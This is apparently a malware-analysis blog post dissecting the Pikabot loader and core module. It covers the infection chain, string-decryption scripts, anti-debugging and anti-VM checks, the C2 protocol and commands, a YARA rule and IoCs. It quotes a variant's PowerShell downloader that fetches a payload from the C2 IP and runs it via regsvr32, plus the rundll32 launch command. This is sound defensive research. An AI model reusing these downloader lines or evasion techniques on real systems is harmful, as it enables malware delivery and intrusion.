---
weight: 1
title: "Pikabot deep analysis"
date: 2023-07-31T09:04:49+08:00
lastmod: 2023-07-31T09:04:49+08:00
draft: false
author: "Mohamed Adel"
authorLink: "https://d01a.github.io"
description: "Pikabot loader and core deep analysis"
images: []
resources:
  - name: "featured-image"
    src: "featured-image.jpg"

tags: ["Malware Analysis", "Reverse Engineering"]
categories: ["Malware Analysis"]

lightgallery: true

toc:
  auto: false
---

## Introduction

Pikabot is a new malware first seen in early 2023. It has two components: Loader and core module. It is still in its initial stages, expected to see increasing activity in the future.
Some researchers believe that it is linked to TA570 because of the similarity of delivering method between it and `Qbot` trojan. And the absence of `Qbot` activity in the period of `pikabot` activity.
The Loader usage is to perform a lot of Anti-debug, Anti-VM and Anti-emulation checks to make it harder for automated analysis and inject the core module.
The strings are obfuscated using the stack and simple Bitwise operation. The constant integers are obfuscated using structures and loops to get the right offset.
The core module has a lot of functionality that gives the attacker full control of the victim machine.

## Analysis

### First stage: JS & PowerShell

The infection starts with a malicious email containing a link that downloads a JS file that used to download `Pikabot` DLL. The sample discussed here can be found on [malware-traffic-analysis](https://www.malware-traffic-analysis.net/2023/05/23/index.html) .
The threat actor tried to make the script look legit by embedding some comments related to MIT License of some opensource projects, [zlib](https://github.com/madler/zlib/blob/master/zlib.h0) , [pako](https://github.com/nodeca/pako) and [react-redux](https://github.com/nodeca/pako). Also, the names he used are not randomized and begin with `MIT`.

![Untitled](PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled.png)

The script contains 1,759 lines of code. So, instead of wasting time trying to figure out what is going on, I debugged the script using the browser. Not too much appears but the string `PowerShell` is used. so, we can make use of PowerShell logging feature to catch the script for us.
I Enabled PowerShell Logging and Transcript logging that get the full PowerShell session with the output. Let the sample runs and check the logs:

![Untitled](PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%201.png)

Checking the transcript log file created to see the full session.

![Untitled](PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%202.png)

The first script is the RAW data the retrieved from the JS file and the second one is the decoded one. Let's look at the script. [pastebin](https://pastebin.com/emNXb6uN)

![Untitled](PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%203.png)

The first 6 Variables (numbered lines) weren't used anywhere in the code. They contain some invalid URLs and IPs. The list can be found in the following table.

- Note: Every variable contains not only one base64 encoded string but multiple, separated by a character. e.g., `$rifflers` uses `q` character as a separator and `$gentlewomanlike` that contains valid IP list uses `XO` as a separator. Just delete the separator and decode the string will work.

| URL                                     | Status    |
| --------------------------------------- | --------- |
| http[://]Supermysteries[.]creditcard    | Not found |
| https[://]205.194.71[.]236              | Not found |
| https[://]punishes[.]vacations          | Not found |
| https[://]profiters[.]construction      | Not found |
| https[://]83.99.144[.]199               | Not found |
| http[://]whittret[.]hamburg             | Not found |
| https[://]AdelochordaIntroverse[.]pizza | Not found |
| https[://]98.81.136[.]149               | Not found |
| https[://]UnredeemedlyBeadeyes[.]land   | Not found |
| http[://]81.179.42[.]197                | Not found |
| http[://]Leavings[.]florist             | Not found |
| http[://]55.112.208[.]170               | Not found |
| http[://]wilded[.]parts                 | Not found |
| https[://]AlbergatriceRepaginated[.]xxx | Not found |
| http[://]heptameron[.]se                | Not found |
| http[://]51.238.155[.]130               | Not found |
| https[://]Bigeminy[.]tokyo              | Not found |
| https[://]144.206.78[.]90               | Not found |
| https[://]zeatin[.]marketing            | Not found |
| http[://]countervene[.]agency           | Not found |

Going back to the script, it iterates through the variable `$gentlewomanlike` using `XO` as a separator between each Base64-encoded string. There are more unused URLs in the script. But the used strings that initiate a request t them are:

- http[://]126.228.74[.]105/bm/IMgP
- http[://]74.147.74[.]110/oc1Cs/lhdGK
- http[://]227.191.163[.]233/eHDP/WLmO
- http[://]151.236.14[.]179/DekOPg/Kmn40
- http[://]192.121.17[.]92/JTi/IK2I8szLO
- http[://]192.121.17[.]68/9Cm9EW/BVteE

After Downloading the DLL, rundll32 to run It.

```
start rundll32 $env:ProgramData\\forerankSomnolescent.EuthanasyUnblushingly,vips;MITLicense

```

### Second stage: Pikabot Loader

To get the final payload, I used `unpacme`. for the unpacked sample, see [unpacme result](https://www.unpac.me/results/0a65b4be-8ae6-4ced-8e2e-f333e85ac369#/)

> NOTE: The unpacked DLL is broken so, if you want to debug the sample you can use this sample

At the end of `DllEntryPoint` There is a call to the main function of the malware that contains all its functionality.

![Untitled](PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%204.png)

> All functions will have the same structure. First there is some code to obfuscate the numbers used later, then decoding the required strings and in the end, it will resolve the required functions and calls it.

One of the first things the malware does is to resolve the required APIs. `Pikabot` resolves two functions that will be used to get the addresses of the required APIs; `GetProcAddress` and `LoadLibraryA` by searching through `Kernel32.dll` exports using a Hash of each API; `0x57889AF9` and `0x0B1C126D`, respectively.

![Untitled](PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%205.png)

### String decryption

The malware uses stack strings followed by a single bitwise operation. The operation and the key are different throughout the strings so, the best option is to emulate this part to get the decoded strings.
The decoding operation takes a constant pattern as follows.

1. Construct the stack strings.
2. loop all over the string to execute the decoding operation.
3. move the string to its location.
4. check `ecx` counter register against hardcoded string length.

![Untitled](PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%206.png)

I will use [Qiling](https://github.com/qilingframework/qiling) in the emulation. First let's try with a single string.

> NOTE: The script did not run with me if the DLL is not located in a sub path of rootfs. For more information about the installation process look at the documentation or this blog.

```python
from qiling import *
from qiling.const import QL_VERBOSE

argv = [r"qiling\\examples\\rootfs\\x86_windows\\Windows\\bin\\pika.dll"]
rootfs = r"qiling\\examples\\rootfs\\x86_windows"

ql = Qiling(argv=argv, rootfs=rootfs, verbose=QL_VERBOSE.OFF)

ql.emu_start(begin=0x10005542, end=0x10005588)
print(ql.mem.read(ql.arch.regs.ebp - 0x40 ,ql.arch.regs.ecx+1))
ql.emu_stop()

```

![Untitled](PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%207.png)

The first stack string is `AddVectoredExceptionHandler`. Now we want to make go decode all the strings of the binary.

> The method I will use here based on OALABS Blog

How to locate where stack strings are decoded? Every Block of stack strings ends with `cmp REG, <STRING_LENGTH>` followed by a `jl`. So, if we locate this pattern, we can backtrack to find a sequence of `mov` instruction. How to do this?

1. Locate every basic block end with `jl` and `cmp REG,<constant>`
2. Record the address of `jl` + 0x4 as the emulation stop address.
3. backtrack to find the string offset. The first `mov` instruction starting from the end (`jl`)
4. Record the stack offset (first argument)
5. Find the first `mov` instruction as the emulation address.

I tried to emulate it with `qiling` but it has some problems:

1. Not using `ebp` register in all the references.
2. Too slow as `qiling` will load in every string decoding. (If loaded once, most of the strings will not be decoded as the address will be pointing to unmapped region of memory)

> Qiling script will be helpful if you want to get a specific string.

I wrote this script to manually decode the strings. can be found on my [github](https://github.com/d01a/IDAPython_scripts/blob/master/Pikabot_string_decode.py)

```python
import ctypes
import idc
import idaapi
import idautils

def get_operand_offset(ea):
    op_offset = idc.get_operand_value(ea, 0)
    return ctypes.c_int(op_offset).value
def get_second_operand(ea):
    op_offset = idc.get_operand_value(ea, 1)
    return ctypes.c_uint(op_offset).value
def get_second_operand_short(ea):
    op_offset = idc.get_operand_value(ea, 1)
    return ctypes.c_ushort(op_offset).value

def get_bitwise_op(ea, block_start_ea):
    while (
        idc.print_insn_mnem(ea) != "xor"
        and idc.print_insn_mnem(ea) != "add"
        and idc.print_insn_mnem(ea) != "and"
        and idc.print_insn_mnem(ea) != "sub"
    ) and ea > block_start_ea:
        ea = idc.prev_head(ea)
    return ea

def bitwise_and_bytes(a, b):
    result_int = int.from_bytes(a, byteorder="little") & int.from_bytes(b, byteorder="little")
    result_int = result_int & 0x00FF
    return result_int.to_bytes(1, byteorder="little")
def bitwise_sub_bytes(a, b):
    result_int = int.from_bytes(a, byteorder="little") - int.from_bytes(b, byteorder="little")
    result_int = result_int & 0x00FF
    # print(result_int)
    return result_int.to_bytes(1, byteorder="little")
def bitwise_add_bytes(a, b):
    result_int = int.from_bytes(a, byteorder="little") + int.from_bytes(b, byteorder="little")
    result_int = result_int & 0x00FF
    return result_int.to_bytes(1, byteorder="little")
def bitwise_xor_bytes(a, b):
    result_int = int.from_bytes(a, byteorder="little") ^ int.from_bytes(b, byteorder="little")
    result_int = result_int & 0x00FF
    return result_int.to_bytes(1, byteorder="little")

def set_comment(address, text):
    idc.set_cmt(address, text, 0)
def is_valid_cmp(ea):
    if idc.print_insn_mnem(ea) == "cmp":
        if idc.get_operand_type(ea, 0) == 1 and idc.get_operand_type(ea, 1) == 5:
            return True
    return False

def parse_fn(fn):
    out = []
    func = ida_funcs.get_func(fn)  # get function pointer
    func_fc = list(idaapi.FlowChart(func, flags=idaapi.FC_PREDS))  # get function flowchart object (list of blocks)
    for block_index in range(len(func_fc)):
        block = func_fc[block_index]
        last_inst = idc.prev_head(block.end_ea)
        if idc.print_insn_mnem(last_inst) == "jl" and is_valid_cmp(idc.prev_head(last_inst)):
            stack_end_ea = block.end_ea
            prev_block = func_fc[block_index - 1]
            stack_start_ea = prev_block.start_ea
            first_BB_end = prev_block.end_ea
            # get stack offset
            inst_ptr = last_inst
            while inst_ptr >= block.start_ea:
                inst_ptr = idc.prev_head(inst_ptr)
                if idc.print_insn_mnem(inst_ptr) == "mov" and get_second_operand(idc.prev_head(inst_ptr)) <= 255:
                    out.append(
                        {
                            "start": stack_start_ea,
                            "end": stack_end_ea,
                            "first_BB_end": first_BB_end,
                            "bitwise_op": get_bitwise_op(inst_ptr, block.start_ea),
                        }
                    )
                    break
    return out

# get the addresses of stack strings
def get_all_strings():
    stack_strings = []
    for f in idautils.Functions():
        out = parse_fn(f)
        stack_strings += out
    return stack_strings

def decode_strings(stack_strings):
    strings = {}
    for ss in stack_strings:
        try:
            out = emulate(ss.get("start"), ss.get("end"), ss.get("first_BB_end"), ss.get("bitwise_op"))
            print(f"{hex(ss.get('start'))}: {out.decode('utf-8',errors='ignore')}")
            strings[ss.get("start")] = out.decode("utf-8", errors="ignore")
        except Exception as e:
            print(e)
            print(f"Failed decoding: {hex(ss.get('start'))}")
    return strings

def ss_decrypt(operation, key, byte_str):
    output = b""
    for i in byte_str:
        i = i.to_bytes(1, byteorder="little")
        if operation == "xor":
            output += bitwise_xor_bytes(i, key)
        elif operation == "add":
            output += bitwise_add_bytes(i, key)
        elif operation == "and":
            output += bitwise_and_bytes(i, key)
        elif operation == "sub":
            output += bitwise_sub_bytes(i, key)
    return output

def get_byte_string(start, end, str_len):
    byte_str = b""
    inst_ptr = end
    while inst_ptr >= start:
        inst_ptr = idc.prev_head(inst_ptr)
        if idc.print_insn_mnem(inst_ptr) == "mov":
            if idc.get_operand_type(inst_ptr, 1) == 5:
                dtype_val = idautils.DecodeInstruction(inst_ptr)
                if ida_ua.get_dtype_size(dtype_val.Op1.dtype) == 2:
                    temp = get_second_operand_short(inst_ptr)
                else:
                    temp = get_second_operand(inst_ptr)
                temp = temp.to_bytes(4, byteorder="little")
                # print(f"str: {temp}")
                # insert at the beginning of the string.
                temp_list = list(temp)
                byte_str_list = list(byte_str)
                temp_list.extend(byte_str_list)
                byte_str = bytes(temp_list)
    byte_str = byte_str.replace(b"\\x00", b"")
    print(f"byte_str: {byte_str}")
    return byte_str

def emulate(start, end, first_BB_end, bitwise_op_addr):
    last_inst = idc.prev_head(end)
    operation = idc.print_insn_mnem(bitwise_op_addr)
    key = get_second_operand(bitwise_op_addr)
    print(f"address:{hex(bitwise_op_addr)} key: {hex(key)}")
    key = key.to_bytes(1, byteorder="little")
    str_len = get_second_operand(idc.prev_head(last_inst))
    byte_str = get_byte_string(start, first_BB_end, str_len)
    string = ss_decrypt(operation, key, byte_str)
    return string

def main():
    stack_strings = get_all_strings()
    strings = decode_strings(stack_strings)
    for k,v in strings.items():
      set_comment(k,v)

if __name__ == "__main__":
    main()

```

**Result:**
Works well for most of the strings. But it fails at two cases where the strings not in the pattern explained previously or it uses `SIMD` instructions like `psubb`. We can decode them with the first script.

![Untitled](PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%208.png)

### Dynamic API resolving

the malware uses `LoadLibraryA` and `GetProcAddress` to get the function Address. They choses the appropriate DLL by passing a flag in the first Argument.

| flag | DLL          |
| ---- | ------------ |
| 1    | Kernel32.dll |
| 2    | User32.dll   |
| 3    | ntdll.dll    |

### Anti Analysis

The malware uses a series of anti-debugging checks before continuing, the checks used:

1. Test Exception EXCEPTION_BREAKPOINT (0x80000003) using the resolved `AddVectoredExceptionHandler` followed by a function to trigger the `EXCEPTION_BREAKPOINT` exception using `INT 0x2D`. Then it removes the handler using `RemoveVectoredExceptionHandler`. In a subsequent call, it uses `int 3` instead of `int 0x2D`.

![Untitled](PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%209.png)

2.  check `BeingDebugged` flag.
3.  Win32 API `CheckRemoteDebuggerPresent` and `IsDebuggerPresent`
4.  delay the execution using `beep` function to escape Sandbox environments.
5.  Anti-VM trick is that it imports different Libraries that don't exist in most of the VMs and Sandboxes. Libraries are: `NlsData0000.DLL` , `NetProjW.DLL` , `Ghofr.LL` and `fg122.DLL`.
6.  Checks `NtGlobalFlag` as it is equal zero by default but set to 0x70 if a debugger is attached.
7.  Calls `NtQueryInformationProcess` with `ProcessDebugPort` (0x7) Flag.
8.  Function `sub_10002315` has a couple of _Anti debugging & Anti Emulation_ checks. The first it Uses `GetWriteWatch` and `VirtualAlloc` APIs To test for a Debugger attached or Sandbox environment by making a call to `VirtualAlloc` with `MEM_WRITE_WATCH` Flag specified, then call `GetWriteWatch` to retrieve the addresses of the allocated pages that has been written to since the allocation or the write-track state has been reset. [PoC](https://github.com/BaumFX/cpp-anti-debug/blob/master/anti_debug.cpp#L260).
    The second check is a series of function calls that are responsible for checking if the malware runs in sandbox or emulation environment. its return values will determine if the system is running normal or something is happening (Sandbox or emulation). It starts by checking the atom name using `GlobalGetAtomNameW` passing invalid `nAtom = 0` parameter and checking the return value _(Should be 0)_.

    ![Untitled](PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2010.png)

    The next is to call `GetEnvirnmentVariableA` with `lpName =  %random_file_name_that_doesnt_exist?[]<>@\\;*!-{}#:/~%` expecting it to return 0 as it is likely to have an environment variable name like that.
    Then, it calls `GetBinaryTypeA` with `lpApplicationName = %random_file_name_that_doesnt_exist?[]<>@\\;*!-{}#:/~%` expecting it to return 0 as well.
    Then it calls `HeapQueryInformation` with invalid `HEAP_INFORMATION_CLASS` value (69). Same thing with `ReadProcessMemory` API passing invalid address `0x69696969`.
    Then, it is called `GetThreadContext` passing reused allocated memory and not a pointer to `Context` structure.

9.  Uses `SetLastError` and `GetLastError` with _OutputDebugStringA("anti-debugging test.")_ to check if the debugger attached, the debug message will be printed successfully and. If the debugger is not attached, the error code will be changed indicating that no debugger is attached.
10. Check the number of processors using `GetSystemInfo`. Less than 2 return 0 indicating VM environment.
11. Uses `__rdtsc` twice to detect single stepping in the debuggers. the same thing with `QueryerformanceCounter` and `GetTickCount64`.
12. Check the memory size with `GlobalMemoryStatusEx` to check if it is less than 2 GB.
13. Check the `Trap` flag (T) as indicator if single stepping.

### Unpacking Core module

After doing Anti-Analysis checks, the Loader extracts the core module from the resource section. The core module is scattered through multiple PNG files in `RCData` -In this sample- Resource. It checks for 4 Bytes string in the resource, It's the beginning of the encrypted blob of the core component. In the sample we are discussing are `ttyf` and `oEom`

After getting the offset of the beginning of the encrypted data. It decrypts a 20-byte string to use it as an XOR key to perform the first stage of the decryption. To get the key, the function needs to be emulated from the beginning as it makes some calculations to decode the twenty bytes -scattered through multiple variables- then, gather them into one variable.

![Untitled](PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2011.png)

```python
from qiling import *
from qiling.const import QL_VERBOSE

argv = [r"qiling\\examples\\rootfs\\x86_windows\\Windows\\bin\\pika.dll"]
rootfs = r"qiling\\examples\\rootfs\\x86_windows"

ql = Qiling(argv=argv, rootfs=rootfs, verbose=QL_VERBOSE.OFF)

ql.emu_start(begin=0x10011A5E, end=0x100121DF)
print(ql.mem.read(ql.arch.regs.ebp - 0x4c ,0x14))
ql.emu_stop()

```

**The output**

![Untitled](PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2012.png)

The core module is stored in two PNG images in the resource section. After The XOR operation is done, The XORed data is then decrypted using AES (CBC) Algorithm using a 32-byte key and the first 16-byte of the key used as an initialization vector. In this sample the Key is decrypted at the address `0x100114B0`, after emulating this section, we got the key `q10u9EYBtqXC1XUhmGmI7XUitdOpydzB`.
After Decrypting the Core module, it is injected in `C:\\Windows\\SysWOW64\\SndVol.exe` process.

> Note: the target process varies across the samples. I looked at another one and it was C:\\Windows\\System32\\WWAHost.exe

To get the core module, you can put a breakpoint on `WriteProcessMemory` and dump the memory buffer containing the injected code. In my case I had to change the name of the target process as the original target process does not exist on my machine.

> The whole binary is not written in one time so be patient OR write down the address of the injected code in the target process and put a breakpoint on ResumeThread and dump the address, it will be mapped to you will need to unmap it first. OR you can just dump the heap buffer that contains the decrypted data and dump the memory section, but it will need to be cleaned.

![Untitled](PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2013.png)

### Third stage: Pikabot Core module

> I uploaded the unpacked sample to [malware bazaar] (MalwareBazaar | SHA256 11cbb0233aff83d54e0d9189d3a08d02a6bbb0ffa5c3b161df462780e0ee2d2d (abuse.ch))

The core module uses the same string encryption method so applying the previous script works well.
The DLL contains a small number of functions and exports. `DllRegisterServer` contains a call to `sub_100025FF` function that has all the functionality of the Core module.
The same API dynamic resolving function (_sub_100036BA_) is used but more DLLs are added to use network and other functionalities required. The Additional DLLs are: `Wininet.dll`, `Advapi32.dll` and `NetApi32.dll`

### System language check

The first thing the malware does is to check the language code of the victim machine.

![Untitled](PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2014.png)

If the Region is one of the following lists, the malware will exit without any further activity.

- Georgia
- Kazakhstan
- Tajikistan
- Russia
- Ukraine
- Belarus

### Anti Analysis

Then, it performs some basic anti debugging checks (`sub_10001994`).

- `BeingDebugged` flag.
- `NtGlobalFlag` ANDed with 0x70 to check if a debugger is attached.
- `rdtsc` instruction. check the delay between two calls.
- Trap flag (T) of the `EFLAGS` register (T flag is the eighth bit)

And it uses two Anti VM checks (`sub_10001AA6`):

- It executes `cpuid` instruction with `EAX = 0x40000000` to return Hypervisor brand and compare the returned value in the _ECX == 0x4D566572_ and _EDX == 0x65726177_ which are VMware CPUID value (for more explanation and how to defeat it, check this [blog](https://rayanfam.com/topics/defeating-malware-anti-vm-techniques-cpuid-based-instructions/)).
- Check the existence of Virtual Box related registry key `HARDWARE\\\\ACPI\\\\DSDT\\\\VBOX__`
  ![Untitled](PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2015.png)

The malware then checks the command execution functionality using a command that vary across the samples.

```bash
cmd.exe /C "ping localhost && copy /b /y %s\\%s %s\\%s"
```

passing this wide string to `wsprintfW` function with only one string `%SystemRoot%` -This could lead to unexpected behavior; it could raise access violation exception or just continue and only the first placeholder replaced. - The output is then executed using `CreateProcessW` and the return value is checked to determine the function's return value, if it is 0, return 0 if not, it will call `CloseHandle()` twice:

- The first with a valid handle to close the process created.
- the second with invalid handle = 0, will return 0 -or should be 0 in normal systems, this could be anti-sandbox/emulation not sure as the function's return value is not used-.

![Untitled](PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2016.png)

### Hardcoded Mutex!

It uses a hardcoded mutex value `{99C10657-633C-4165-9D0A-082238CB9FE0}` to make sure that the victim is not infected twice by calling `CreateMutexW` followed by a call to `GetLastError` to check the last error code.

![Untitled](PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2017.png)

### Collect victim info.

The next step is to collect some information about the victim system to send them to the C2 server (`sub_10008263`). The first thing you will see at the beginning of this function is a big stack string. This string is the schema that will be filled with the victim info, decoding this string will give us the following.

![Untitled](PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2018.png)

The **stream** = `bb_d2@T@dd48940b389148069ffc1db3f2f38c0e` and **version** = `0.1.7` are predefined in the binary.
The information collection process is done as follows (`sub_1000241E`):

- Get the `os_version` from `OSMajorVersion` , `OSMinorVersion` and `OSBuildNumber` from the PEB structure and `GetProductInfo` API.
- Get the victim's `username` by calling `GetUserNameW` API.
- Get the `pc_name` by calling `GetComputerName` API.
- Get the `cpu_name` by executing `cpuid` instruction with initial value `EAX = 0x80000000`.
- Get the `gpu_name` by calling `EnumDisplayDevicesW` API.
- Get the `ram_amount` by calling `GlobalMemoryStatusEx` API.
- Get the `pc_uptime` by calling `GetTickCount` API.
- Get the `screen_resolution` by calling `GetWindowRect` and `GetDesktopWindow` APIs.
- Get the `arch` by calling `GetSystemInfo` API.
- Get the `domain_name` by calling `GetComputerNameExW` API.
- Get `domain_controller_name` by calling `DsGetDcNameW` API or return `unknown` if not available.
  Each data item fills its location by calling `wsprintfW` function so, it will become like the following but with the victim collected data.

```json
"{"uuid": "uuid",
"stream": "bb_d2@T@dd48940b389148069ffc1db3f2f38c0e",
 "os_version": "OS version and build number",
 "product_number": ,
 "username": " victim username",
 "pc_name": "computer name",
"cpu_name": "cpu name",
 "arch": "system architecture",
"pc_uptime": ,
"gpu_name": "gpu name",
 "ram_amount": "ram amount",
 "screen_resolution": "screen resolution",
 "version": "0.1.7",
"av_software": "unknown",
 "domain_name": "",
 "domain_controller_name": "unknown",
 "domain_controller_address": "unknown"}"

```

### C2 server communication

The data collected is encoded using standard Base64 then encrypted using AES using the first 32-byte as the key and the first 16-byte of the key as the IV. then the data decoded with Base64 and sent to C2 server IP = `37.1.215.220` using _POST_ request to the subdirectory `messages/INJtv97YfpOzznVMY`. The response is decoded in the same way too. The initial beacon contains `user_id=Him3xrn9e&team_id=JqLtxw1h` hardcoded string added to IP parameters.
The request header is included in the binary as follows:

```
Content-Type: application/x-www-form-urlencoded\\r\\n
Accept: */*\\r\\n
Accept-Language: en-US,en;q=0.5\\r\\n
Accept-Encoding: gzip, deflate\\r\\n
User-Agent: %s\\r\\n

```

The `User-Agent` is also in the binary, and it is:

```
Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)

```

The response of the initial sent packet (knock) contains some commands to be executed on the victim machine:

| Response    | command                                                                                                                             |
| ----------- | ----------------------------------------------------------------------------------------------------------------------------------- |
| whoami      | execute whoami /all command                                                                                                         |
| ipconfig    | execute ipconfig /all command                                                                                                       |
| screenshoot | take a snapshot of all the running processes of the victim machine using CreateToolhel32Snashot, Process32FirstW and Process32NextW |

The data requested decoded in the following form to be sent to the attacker but to different subdirectory `messages/ADXDAG6`

```json
{ "uuid": "%s", "additional_type": "%s", "data": " " }
```

**How The Command are executed**
The malware add `%SystemRoot%\\SysWoW64\\cmd.exe` to the user environment variables and creates a pipe for covert communication and receiving the output. To get the output is uses the named pipe in `PeekNamedPipe` in an infinite loop and the break condition is when `WaitForSingleObject` sense an object state changing.

### C2 commands

The Malware contains some other commands to do but not all of them are implemented yet.

### task

If the command is **task** the malware do a specified task received from the C2 server, and it has some sub-commands:

![Untitled](PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2019.png)

The output of the commands is sent to another subdirectory `messages/TRCsUVyMigZyuUQ` with the same encoding schema followed before. The commands are the following:

**knock timeout**
Seems to be not fully implemented but from the current state, it sends `Knock Timeout Changed!` to the server in the following JSON. It's used to delay any code execution on the victim machine.

```
 {"uuid": "%s", "task_id": %s, "execution_code": %d, "data": "

```

**additional**
Nothing new here, it has the same `whoami`, `ipconfig` and `screenshoot` commands explained before.

**dll (exe)**
Download another DLL or exe file and run it using Process injection technique. The bot responds with the following with the state of downloading process (in case of failure `Download Failed!`) and the state of the injection process (`Injection Success!` or `Injection Failed!`) but to another subdirectory `messages/DPVHLqEWR4uBk`

```
{"uuid": "%s", "file_hash": "%s", "task_id": %s}

```

**shellcode**
Download a shellcode and run by injecting it in a target process. Same as the DLL case

**cmd**
Execute cmd commands on the target machine. It runs the command with the same method explained previously.

### balancer and init

not implemented yet.

### Another Variants

[sample](https://bazaar.abuse.ch/sample/67c61f649ec276eb57fcfe70dbd6e33b4c05440ee10356a3ef10fad9d0e224ef/)
There are some other variants of the malware loader contains PowerShell script encrypted and stored on the `.rdata` section and it used to start the downloaded DLL using `regsvr32`
the following example script from [OALABS Blog](https://research.openanalysis.net/pikabot/yara/config/loader/2023/02/26/pikabot.html)

```powershell
$nonresistantOutlivesDictatorial = "$env:APPDATA\\Microsoft\\nonresistantOutlivesDictatorial\\AphroniaHaimavati.dll";
md $env:APPDATA\\Microsoft\\nonresistantOutlivesDictatorial;
Start-Process (Get-Command curl.exe).Source -NoNewWindow -ArgumentList '--url <https://37.1.215.220/messages/DBcB6q9SM6> -X POST --insecure --output ', $nonresistantOutlivesDictatorial;
Start-Sleep -Seconds 40;
$ungiantDwarfest = Get-Content $env:APPDATA\\Microsoft\\nonresistantOutlivesDictatorial\\AphroniaHaimavati.dll | %{[Convert]::FromBase64String($_)};
Set-Content $env:APPDATA\\Microsoft\\nonresistantOutlivesDictatorial\\AphroniaHaimavati.dll -Value $ungiantDwarfest -Encoding Byte;
regsvr32 /s $env:APPDATA\\Microsoft\\nonresistantOutlivesDictatorial\\AphroniaHaimavati.dll;

```

## Yara Rule

```python

rule pikabot{
    meta:
        malware = "Pikabot"
        hash = "11cbb0233aff83d54e0d9189d3a08d02a6bbb0ffa5c3b161df462780e0ee2d2d"
        reference = "https://d01a.github.io/"
        author = "d01a"
        description = "detect pikabot loader and core module"

    strings:
        $s1 = {
      8A 44 0D C0
      ?? ?? 
      88 84 0D ?? ?? FF FF 
      4?
      83 ?? ??
      7C ??
      [0-16]
      (C7 45 | 88 95)
    }
    
    condition:
        uint16(0) == 0x5A4D
        and (uint32(uint32(0x3C)) == 0x00004550)
        and all of them
}
```

## IoCs

| IoC                                                              | description     |
| ---------------------------------------------------------------- | --------------- |
| dff2122bb516f71675f766cc1dd87c07ce3c985f98607c25e53dcca87239c5f6 | packed loader   |
| 2411b23bab7703e94897573f3758e1849fdc6f407ea1d1e5da20a4e07ecf3c09 | unpacked loader |
| 59f42ecde152f78731e54ea27e761bba748c9309a6ad1c2fd17f0e8b90f8aed1 | unpacked loader |
| 37.1.215[.]220                                                   | C2 Server IP    |
| {99C10657-633C-4165-9D0A-082238CB9FE0}                           | mutex value     |

## References

- [https://research.openanalysis.net/pikabot/yara/config/loader/2023/02/26/pikabot.html](https://research.openanalysis.net/pikabot/yara/config/loader/2023/02/26/pikabot.html)
- [https://www.zscaler.com/blogs/security-research/technical-analysis-pikabot](https://www.zscaler.com/blogs/security-research/technical-analysis-pikabot)
- [https://n1ght-w0lf.github.io/tutorials/qiling-for-malware-analysis-part-1/](https://n1ght-w0lf.github.io/tutorials/qiling-for-malware-analysis-part-1/)
- [https://github.com/qilingframework/qiling](https://github.com/qilingframework/qiling)
- [https://anti-debug.checkpoint.com/techniques/assembly.html](https://anti-debug.checkpoint.com/techniques/assembly.html)
- [https://unprotect.it/technique/int-0x2d/](https://unprotect.it/technique/int-0x2d/)
- [https://rayanfam.com/topics/defeating-malware-anti-vm-techniques-cpuid-based-instructions/](https://rayanfam.com/topics/defeating-malware-anti-vm-techniques-cpuid-based-instructions/)
